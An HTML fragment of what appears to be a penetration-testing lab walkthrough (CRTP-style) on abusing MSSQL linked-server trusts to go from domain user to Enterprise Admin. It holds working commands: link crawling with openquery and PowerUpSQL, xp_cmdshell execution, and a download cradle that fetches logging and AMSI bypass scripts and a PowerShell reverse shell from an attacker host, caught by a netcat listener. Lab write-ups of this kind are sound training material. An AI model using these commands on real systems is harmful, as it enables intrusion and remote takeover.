+</p><p class="" id="30c79e9a-d7c9-80e4-9c34-e6ac9d6f66bf">we can start by checking the version running this MSSQL, it’s always good to know what version we are working with.<br/><code>Select @@version</code></p><a href="../../assets/crtp/Untitled 149.png"><img src="../../assets/crtp/Untitled 149.png"/></a><p class="" id="30c79e9a-d7c9-8030-957c-ec786c4aff01">The following command will enumerate the linked databases on DCORP-MSSQL.</p><p class="" id="30c79e9a-d7c9-8094-b67e-d696336fb278"><code>Select * From master..sysservers;</code></p><a href="../../assets/crtp/Untitled 150.png"><img src="../../assets/crtp/Untitled 150.png"/></a><p class="" id="30c79e9a-d7c9-806e-a710-cc62d450433d">Above we can see that DCORP-MSSQL database has a link to DCORP-SQL1 as well, let’s now do a further enumeration from DCORP-SQL1.</p><p class="" id="30c79e9a-d7c9-80f1-bf86-cfa781362f69"><code>Select * From openquery("DCORP-SQL1", 'Select * From master..sysservers');</code></p><a href="../../assets/crtp/Untitled 151.png"><img src="../../assets/crtp/Untitled 151.png"/></a><p class="" id="30c79e9a-d7c9-8054-9b8c-f9d1a69167ff">One thing we can do is to nest <code><strong>openquery</strong></code> within another <code><strong>openquery</strong></code> which leads us to <strong>DCORP-MGMT. </strong>So let’s continue…</p><p class="" id="30c79e9a-d7c9-8093-aaa4-fd2af9290f47"><code>select * from openquery("DCORP-SQL1",'select * from openquery("DCORP-MGMT",''select * from master..sysservers'')')</code></p><a href="../../assets/crtp/Untitled 152.png"><img src="../../assets/crtp/Untitled 152.png"/></a><p class="" id="30c79e9a-d7c9-806c-b384-e6390ed9451c">Now we can see that  DCORP-MGMT has also a trust link to EU.SQL30, which is another database server on another root forest(eu.eurocorp.local).</p><p class="" id="30c79e9a-d7c9-805f-b810-f45278025fd3">
+</p><p class="" id="30c79e9a-d7c9-80a1-8a30-caafb09e7385">Now that we have see how we can manually enumerate trust inside MSSQL database, let’s see an automated and fast way to enumerate theses trust links.</p><p class="" id="30c79e9a-d7c9-80d0-bad1-d6105fe254bd">We can use PowerUPSQL module again.</p><p class="" id="30c79e9a-d7c9-8096-b4fc-ee463a911049"><code>Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose</code></p><a href="../../assets/crtp/Untitled 153.png"><img src="../../assets/crtp/Untitled 153.png"/></a><p class="" id="30c79e9a-d7c9-80a4-b829-c05bd4744ac5">Base on the output above from PowerUPSQL, we can see that we do have sysadmin in EU-SQL30.<br/></p><p class="" id="30c79e9a-d7c9-80fb-a77d-fa291edab3bd">From from here we have 2 ways, we can continue on making queries using the MSSQL client HeidiSQL client, or we can continue using PowerUPSQL modules.</p><p class="" id="30c79e9a-d7c9-807f-98ec-fc8dad0d314e">For now let’s continue using PowerUPSQL module <code>Get-SQLServerLinkCrawl</code>.</p><p class="" id="30c79e9a-d7c9-8015-90f4-e65e70fd43a6">
+</p><p class="" id="30c79e9a-d7c9-8083-8679-fd8aceabbf51">Let’s enumerate and check If <code>xp_cmdshell</code> is enabled.</p><p class="" id="30c79e9a-d7c9-805e-9baa-e4c9ae0906ba"><code>Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'set username'"</code></p><a href="../../assets/crtp/Untitled 154.png"><img src="../../assets/crtp/Untitled 154.png"/></a><p class="" id="30c79e9a-d7c9-80cc-8320-f41db8d65600">Well the above screenshot shows us some interesting information… The query we did above was to check if it is possible to execute OS commands using linked databases.<br/>We can see that when we check the  parameters in all Instances, the only one that came up containing some information was the EUSQL30 instance(<code>CustomQuery : {USERNAME=SYSTEM, }</code>), meaning that we can execute OS commands using the trust links between instances.</p><p class="" id="30c79e9a-d7c9-8099-9769-ca1823a1a8cf">
+</p><p class="" id="30c79e9a-d7c9-8069-ab2b-fa61baa39957">We can get a Reverse Shell in this case. to achieve this task we will be using Invoke-PowerShellTcp.ps1 by modifying it and adding the following command on it:<br/><code>Power -Reverse -IPAddress &lt;OUR_IP&gt; -Port 443</code></p><p class="" id="30c79e9a-d7c9-809e-94ef-d5e2a289713a">Open Invoke-PowerShellTcpEx.ps1 in PowerShell ISE (Right click on it and click Edit).</p><a href="../../assets/crtp/Untitled 155.png"><img src="../../assets/crtp/Untitled 155.png"/></a><p class="" id="30c79e9a-d7c9-8099-b533-f4d0a29d8158">
+</p><p class="" id="30c79e9a-d7c9-802a-8b06-f64097288f3a">Let’s try to execute a PowerShell download execute cradle to execute a PowerShell reverse shell on the EU-SQL30 instance. <br/>We should not forget to start a listener on our machine.</p><p class="" id="30c79e9a-d7c9-80bd-be29-f028efc7c8b1">
+</p><p class="" id="30c79e9a-d7c9-800a-9d1a-e17bc55f507b"><code>Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec masterxp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.51/sbloggingbypass.txt); iex (iwr -UseBasicParsing http://172.16.100.51/amsibypass.txt); iex (iwr -UseBasicParsing http://172.16.100.51/Invoke-PowerShellTcpEx.ps1)" '' -QueryTarget EU-SQL30</code></p><p class="" id="30c79e9a-d7c9-802a-b40c-e27805466942">
+</p><p class="" id="30c79e9a-d7c9-8058-b716-f07affacf17b">On our side we can simply start our listener.</p><p class="" id="30c79e9a-d7c9-8090-9a42-f74bf4be30fc"><code>C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443</code></p><a href="../../assets/crtp/Untitled 156.png"><img src="../../assets/crtp/Untitled 156.png"/></a><p class="" id="30c79e9a-d7c9-8098-b5c9-e257c2ac173d">We can see above that we were able to abuse the trust link in <strong>DCORP-MSSQL</strong> all the way to <strong>EU-SQL30</strong>. from a simple Domain user to Enterprise Admin.</p><p class="" id="30c79e9a-d7c9-8065-aa25-da9fb8455fc5">
+</p><p class="" id="30c79e9a-d7c9-80f1-bc41-dc5e2c949046">
+</p>
           </div>
         </section>
       </article>
